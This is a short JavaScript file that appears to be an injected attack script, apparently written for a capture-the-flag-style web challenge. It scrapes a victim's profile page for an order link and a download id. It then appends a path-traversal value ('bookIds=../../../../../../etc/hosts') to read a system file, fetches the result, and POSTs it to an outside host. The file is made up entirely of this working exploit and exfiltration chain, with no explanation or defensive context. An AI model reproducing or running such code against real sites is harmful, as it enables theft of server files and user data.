//
//

var req = new XMLHttpRequest();
req.onload = getFirstLink;
req.open('get', '/profile', true);
req.send();

function getFirstLink() {
    var first_link = this.responseText.match(/href="(\/order\/[0-9]+)"/)[1];
    var req = new XMLHttpRequest();
    req.onload = getDownloadLink;
    req.open('get', first_link, true);
    req.send();
}

//
//

function getDownloadLink() {
    var download_id = this.responseText.match(/href="\/download\/([0-9]+).*bookIds=[0-9]+"/)[1];
    var download_link = '/download/' + download_id;
    const request = new XMLHttpRequest();
    var inject = "?bookIds=1&bookIds=2&bookIds=../../../../../../etc/hosts";
    payload = download_link + inject;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', "http://things.us" + payload, true);
    xhr.responseType = 'blob';
    xhr.onload = function() {
        var blobData = xhr.response;
        var formData = new FormData();
        formData.append('file', blobData);
        var postRequest = new XMLHttpRequest();
        postRequest.open('POST', 'http://yea.things.edu/?payload=' + payload, true);
        postRequest.onload = function() {
            // Code for handling the post request response
        };
        postRequest.send(formData);
    };
    xhr.send();
}

//
//
